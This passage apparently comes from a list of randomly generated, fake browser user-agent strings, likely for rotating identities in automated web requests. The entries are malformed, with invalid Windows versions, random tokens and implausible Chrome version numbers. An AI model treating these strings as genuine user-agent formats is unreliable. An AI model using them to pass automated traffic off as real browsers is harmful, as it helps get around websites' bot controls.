Chrome/114.0.2.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G704G) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4680.88 Chrome/171.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M570M) AppleWebKit/537.36 (KHTML, like Gecko)111.0.4878.46 Chrome/153.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P479P) AppleWebKit/537.36 (KHTML, like Gecko)114.0.4607.88 Chrome/144.0.2.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C549C) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4646.52 Chrome/124.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B565B) AppleWebKit/537.36 (KHTML, like Gecko)136.0.4663.64 Chrome/162.0.3.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I105I) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4768.49 Chrome/109.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y587Y) AppleWebKit/537.36 (KHTML, like Gecko)104.0.4653.57 Chrome/130.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K327K) AppleWebKit/537.36 (KHTML, like Gecko)146.0.4946.74 Chrome/151.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R953R) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4801.43 Chrome/131.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E865E) AppleWebKit/537.36 (KHTML, like Gecko)114.0.4999.98 Chrome/175.0.1.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H661H) AppleWebKit/537.36 (KHTML, like Gecko)112.0.4917.38 Chrome/151.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T142T) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4949.43 Chrome/133.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V446V) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4860.66 Chrome/126.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C348C) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4928.79 Chrome/126.0.4.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U854U) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4890.77 Chrome/109.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C436C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4569.40 Chrome/126.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G420G) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4774.60 Chrome/100.0.2.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E570E) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4715.92 Chrome/164.0.3.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M136M) AppleWebKit/537.36 (KHTML, like Gecko)148.0.4605.74 Chrome/150.0.0.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C820C) AppleWebKit/537.36 (KHTML, like Gecko)117.0.4558.43 Chrome/116.0.5.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D444D) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4547.64 Chrome/150.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R372R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4807.64 Chrome/147.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R380R) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4919.85 Chrome/158.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B421B) AppleWebKit/537.36 (KHTML, like Gecko)133.0.4848.55 Chrome/117.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E848E) AppleWebKit/537.36 (KHTML, like Gecko)143.0.4542.62 Chrome/168.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E431E) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4735.88 Chrome/160.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L551L) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4581.74 Chrome/99.0.5.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S99S) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4655.52 Chrome/105.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G773G) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4810.42 Chrome/135.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W524W) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4760.67 Chrome/126.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N874N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4941.66 Chrome/157.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J637J) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4648.96 Chrome/117.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N884N) AppleWebKit/537.36 (KHTML, like Gecko)111.0.4793.52 Chrome/134.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D600D) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4873.77 Chrome/134.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U721U) AppleWebKit/537.36 (KHTML, like Gecko)113.0.4731.60 Chrome/127.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J553J) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4786.97 Chrome/118.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N32N) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4862.91 Chrome/151.0.3.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M292M) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4645.36 Chrome/169.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y10Y) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4545.40 Chrome/117.0.2.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A450A) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4825.51 Chrome/149.0.5.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K702K) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4600.36 Chrome/113.0.4.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W463W) AppleWebKit/537.36 (KHTML, like Gecko)130.0.4805.63 Chrome/174.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K959K) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4820.71 Chrome/151.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S911S) AppleWebKit/537.36 (KHTML, like Gecko)120.0.4506.64 Chrome/173.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K823K) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4693.42 Chrome/122.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T593T) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4668.53 Chrome/128.0.5.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T302T) AppleWebKit/537.36 (KHTML, like Gecko)131.0.4699.49 Chrome/143.0.1.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X916X) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4742.39 Chrome/170.0.5.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q18Q) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4943.71 Chrome/101.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M751M) AppleWebKit/537.36 (KHTML, like Gecko)117.0.4942.45 Chrome/108.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X782X) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4804.73 Chrome/136.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F7F) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4574.53 Chrome/168.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z329Z) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4639.93 Chrome/139.0.0.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D66D) AppleWebKit/537.36 (KHTML, like Gecko)117.0.4990.79 Chrome/145.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D101D) AppleWebKit/537.36 (KHTML, like Gecko)145.0.4902.90 Chrome/154.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H930H) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4626.89 Chrome/142.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I632I) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4833.85 Chrome/125.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E122E) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4621.71 Chrome/127.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B594B) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4921.83 Chrome/146.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R166R) AppleWebKit/537.36 (KHTML, like Gecko)112.0.4691.94 Chrome/150.0.1.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H274H) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4728.90 Chrome/105.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N301N) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4724.77 Chrome/126.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A788A) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4980.91 Chrome/112.0.4.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G188G) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4963.97 Chrome/130.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z847Z) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4841.85 Chrome/165.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E928E) AppleWebKit/537.36 (KHTML, like Gecko)131.0.4959.83 Chrome/115.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D631D) AppleWebKit/537.36 (KHTML, like Gecko)138.0.4934.64 Chrome/165.0.5.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C594C) AppleWebKit/537.36 (KHTML, like Gecko)113.0.4747.61 Chrome/117.0.2.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X313X) AppleWebKit/537.36 (KHTML, like Gecko)127.0.4963.74 Chrome/158.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O337O) AppleWebKit/537.36 (KHTML, like Gecko)145.0.4702.42 Chrome/130.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C707C) AppleWebKit/537.36 (KHTML, like Gecko)136.0.4601.63 Chrome/121.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E895E) AppleWebKit/537.36 (KHTML, like Gecko)104.0.4962.46 Chrome/112.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U267U) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4525.98 Chrome/100.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W180W) AppleWebKit/537.36 (KHTML, like Gecko)120.0.4765.54 Chrome/156.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K585K) AppleWebKit/537.36 (KHTML, like Gecko)108.0.4894.85 Chrome/125.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E691E) AppleWebKit/537.36 (KHTML, like Gecko)130.0.4624.57 Chrome/135.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W603W) AppleWebKit/537.36 (KHTML, like Gecko)125.0.4587.79 Chrome/162.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G272G) AppleWebKit/537.36 (KHTML, like Gecko)126.0.4598.86 Chrome/132.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V834V) AppleWebKit/537.36 (KHTML, like Gecko)120.0.4756.49 Chrome/173.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K938K) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4526.40 Chrome/111.0.5.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T902T) AppleWebKit/537.36 (KHTML, like Gecko)126.0.4820.87 Chrome/111.0.0.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O910O) AppleWebKit/537.36 (KHTML, like Gecko)133.0.4924.63 Chrome/130.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W225W) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4994.71 Chrome/103.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O473O) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4730.51 Chrome/156.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V853V) AppleWebKit/537.36 (KHTML, like Gecko)113.0.4857.65 Chrome/114.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J245J) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4679.79 Chrome/117.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D326D) AppleWebKit/537.36 (KHTML, like Gecko)112.0.4827.95 Chrome/122.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A424A) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4503.98 Chrome/115.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N52N) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4953.38 Chrome/116.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M663M) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4739.36 Chrome/103.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R512R) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4741.39 Chrome/113.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L712L) AppleWebKit/537.36 (KHTML, like Gecko)148.0.4532.60 Chrome/158.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S11S) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4849.45 Chrome/171.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U291U) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4552.83 Chrome/107.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A187A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4688.51 Chrome/119.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S682S) AppleWebKit/537.36 (KHTML, like Gecko)127.0.4828.86 Chrome/138.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H538H) AppleWebKit/537.36 (KHTML, like Gecko)131.0.4672.72 Chrome/171.0.2.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N609N) AppleWebKit/537.36 (KHTML, like Gecko)133.0.4501.71 Chrome/103.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C244C) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4573.69 Chrome/108.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P278P) AppleWebKit/537.36 (KHTML, like Gecko)111.0.4730.70 Chrome/145.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K429K) AppleWebKit/537.36 (KHTML, like Gecko)131.0.4960.53 Chrome/126.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y735Y) AppleWebKit/537.36 (KHTML, like Gecko)113.0.4810.39 Chrome/100.0.0.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O164O) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4803.90 Chrome/145.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z603Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4517.51 Chrome/171.0.4.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D742D) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4646.89 Chrome/112.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G106G) AppleWebKit/537.36 (KHTML, like Gecko)137.0.4964.53 Chrome/137.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V381V) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4859.35 Chrome/115.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L316L) AppleWebKit/537.36 (KHTML, like Gecko)114.0.4957.70 Chrome/105.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M348M) AppleWebKit/537.36 (KHTML, like Gecko)114.0.4539.53 Chrome/146.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H155H) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4821.81 Chrome/170.0.0.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R138R) AppleWebKit/537.36 (KHTML, like Gecko)131.0.4676.59 Chrome/171.0.1.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D713D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4561.67 Chrome/154.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E955E) AppleWebKit/537.36 (KHTML, like Gecko)136.0.4978.96 Chrome/141.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X764X) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4856.62 Chrome/142.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F953F) AppleWebKit/537.36 (KHTML, like Gecko)137.0.4662.90 Chrome/103.0.1.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E476E) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4590.91 Chrome/153.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D972D) AppleWebKit/537.36 (KHTML, like Gecko)145.0.4537.78 Chrome/144.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O195O) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4690.72 Chrome/149.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R573R) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4655.59 Chrome/150.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G373G) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4948.89 Chrome/154.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R478R) AppleWebKit/537.36 (KHTML, like Gecko)137.0.4543.94 Chrome/132.0.3.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q258Q) AppleWebKit/537.36 (KHTML, like Gecko)104.0.4678.64 Chrome/145.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X692X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4696.84 Chrome/169.0.3.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J974J) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4928.37 Chrome/125.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K886K) AppleWebKit/537.36 (KHTML, like Gecko)122.0.4989.84 Chrome/125.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q966Q) AppleWebKit/537.36 (KHTML, like Gecko)136.0.4720.75 Chrome/109.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C633C) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4617.64 Chrome/108.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q399Q) AppleWebKit/537.36 (KHTML, like Gecko)108.0.4751.55 Chrome/149.0.5.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S730S) AppleWebKit/537.36 (KHTML, like Gecko)111.0.4552.45 Chrome/170.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N939N) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4929.78 Chrome/112.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J505J) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4590.54 Chrome/120.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N966N) AppleWebKit/537.36 (KHTML, like Gecko)122.0.4887.93 Chrome/158.0.2.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N100N) AppleWebKit/537.36 (KHTML, like Gecko)113.0.4840.76 Chrome/102.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T542T) AppleWebKit/537.36 (KHTML, like Gecko)148.0.4803.69 Chrome/132.0.2.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V600V) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4987.82 Chrome/150.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X455X) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4920.52 Chrome/117.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R580R) AppleWebKit/537.36 (KHTML, like Gecko)133.0.4986.59 Chrome/143.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W728W) AppleWebKit/537.36 (KHTML, like Gecko)114.0.4585.97 Chrome/117.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R233R) AppleWebKit/537.36 (KHTML, like Gecko)127.0.4571.70 Chrome/116.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N986N) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4529.64 Chrome/102.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y954Y) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4503.61 Chrome/164.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z581Z) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4856.92 Chrome/145.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C17C) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4918.77 Chrome/103.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C663C) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4518.35 Chrome/102.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O323O) AppleWebKit/537.36 (KHTML, like Gecko)131.0.4709.80 Chrome/156.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E202E) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4893.53 Chrome/165.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L39L) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4821.90 Chrome/149.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R531R) AppleWebKit/537.36 (KHTML, like Gecko)144.0.4718.81 Chrome/159.0.2.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P370P) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4590.93 Chrome/163.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L684L) AppleWebKit/537.36 (KHTML, like Gecko)138.0.4538.57 Chrome/126.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A865A) AppleWebKit/537.36 (KHTML, like Gecko)128.0.4906.42 Chrome/171.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H289H) AppleWebKit/537.36 (KHTML, like Gecko)126.0.4892.88 Chrome/100.0.0.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D648D) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4951.90 Chrome/171.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q120Q) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4713.89 Chrome/146.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z674Z) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4506.65 Chrome/103.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T293T) AppleWebKit/537.36 (KHTML, like Gecko)125.0.4918.75 Chrome/141.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T615T) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4745.85 Chrome/141.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V378V) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4716.53 Chrome/130.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S102S) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4683.97 Chrome/133.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R143R) AppleWebKit/537.36 (KHTML, like Gecko)136.0.4914.42 Chrome/133.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I974I) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4981.83 Chrome/162.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D966D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4616.42 Chrome/150.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z654Z) AppleWebKit/537.36 (KHTML, like Gecko)132.0.4717.66 Chrome/123.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V799V) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4565.90 Chrome/100.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 